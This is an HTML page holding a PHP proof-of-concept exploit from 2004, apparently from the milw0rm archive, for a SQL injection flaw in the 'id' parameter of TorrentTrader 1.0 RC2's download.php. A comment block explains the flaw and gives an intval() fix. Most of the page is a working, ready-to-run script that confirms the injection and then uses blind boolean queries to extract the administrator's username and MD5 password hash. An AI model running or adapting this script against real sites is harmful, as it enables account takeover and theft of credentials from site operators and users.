<html><head><title>TorrentTrader 1.0 RC2 SQL Injection Exploit</title></head><pre>#!/usr/bin/php 


&lt;? 


/* 


TorrentTrader 1.0 RC2 SQL Injection Proof of Concept 
By aCiDBiTS acidbits_at_hotmail.com 31-August-2004 


&quot;TorrentTrader (http://www.torrenttrader.com/) is a feature packed and 
highly customisable open-source BitTorrent tracker.&quot; 


This PoC dumps the username and password's md5 hash of first user in 
TorrentTrader web application database, that should be the administrator. 
First it fetchs a valid torrent id, then it determines if database's user 
can perform &quot;union select&quot; and finally obtains the username and 
md5(password). Tested on TorrentTrader 1.0 RC2, maybe older versions also 
vulnerable. 


Usage (in my debian box): 
php4 -q ./tt_sqli_poc.php &quot;http://127.0.0.1/torrenttrade&quot; 



++ Vulnerability description &amp; workaround++ 


There is no user input sanization for parameter &quot;id&quot; in download.php prior 
beeing used in a SQL query. This can be exploited to manipulate SQL queries 
by injecting arbitrary SQL code. A workaround to solve this is to modify 
download.php, line13: 


$res = mysql_query(&quot;SELECT filename FROM torrents WHERE id = $id&quot;); 


With: 


$res = mysql_query(&quot;SELECT filename FROM torrents WHERE id = 
&quot;.intval($id)); 



*/ 



echo &quot;+----------------------------------------------------------+\n| 
TorrentTrader 1.0 RC2 SQL Injection Proof of Concept |\n| By aCiDBiTS 
acidbits_at_hotmail.com 31-August-2004 
|\n+----------------------------------------------------------+\n\n&quot;; 



if($argc&lt;2) die(&quot;Usage: &quot;.$argv[0].&quot; URL_to_TorrentTrader_script\n\n&quot;); 
$host=$argv[1]; 
if(substr($host,strlen($host)-1,1)!='/') $host.='/'; 


echo &quot;[+] Getting valid torrent id ... &quot;; 
$webc=get_web($host); 
$temp=explode(&quot;torrents-details.php?id=&quot;,$webc); 
$id=intval($temp[1]); 
if( !$id ) die( &quot;Failed!\n\n&quot;); 
echo &quot;OK\n Using Torrent id: $id\n\n&quot;; 


echo &quot;[+] Checking if injection is possible ... &quot;; 
$bas=$id.&quot;%20and%200%20union%20select%201%20from%20users%20where%20&quot;; 
if( test_cond( $bas.&quot;1&quot; ) &amp;&amp; !test_cond( $bas.&quot;0&quot; ) ) echo &quot; OK\n\n&quot;; else 
die (&quot;\n\n Failed! \n\n&quot;); 


echo &quot;[+] Getting username &amp; password ... \n Username: &quot;; 
get_field( &quot;username&quot;); 
echo &quot;\n MD5(Password): &quot;; 
get_field( &quot;password&quot; ); 


die(&quot;\n\n \ / \ /\n (Oo) Done! (oO)\n //||\\\\ 
//||\\\\\n\n&quot;); 



function test_cond( $cond ) 
{ 
global $host; 
$res=get_web( $host.&quot;download.php?id=&quot;.$cond); 
if( eregi( &quot;The ID has been found on the Database, but the torrent has 
gone!&quot;, $res ) ) 
return 1; 
else return 0; 
} 



function get_field( $field ) 
{ 
global $bas; 
$unval= &quot; 0123456789ABCDEFGHIJKLMNOPRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;; 
$idx=1; 
$min=0; 
$max=strlen($unval); 
while($min!=$max) { 
$mid=$min+(($max-$min)/2); 
if( 
test_cond($bas.&quot;id=1%20and%20ord(substring($field,$idx,1))=&quot;.ord(substr($unval,$mid,1))) 
) { 
$idx++; 
echo substr($unval,$mid,1); 
$min=0; 
$max=strlen($unval); 
if( !test_cond($bas.&quot;id=1%20and%20ord(substring($field,$idx,1))&quot;) ) 
return; 
} else { 
if( 
test_cond($bas.&quot;id=1%20and%20ord(substring($field,$idx,1))&lt;&quot;.ord(substr($unval,$mid,1))) 
) $max=$mid; 
else $min=$mid; 
} 
} 
die( &quot;\n\nUnexpected error!\n\n&quot;); 
} 



function get_web($url) 
{ 
$ch=curl_init(); 
curl_setopt ($ch, CURLOPT_URL, $url); 
curl_setopt ($ch, CURLOPT_HEADER, 0); 
curl_setopt ($ch, CURLOPT_RETURNTRANSFER,1); 
$data=curl_exec ($ch); 
curl_close ($ch); 
return $data; 
} 



/* \ / 
(Oo) 
//||\\ */ 


?&gt;

# milw0rm.com [2004-09-01]</pre></html>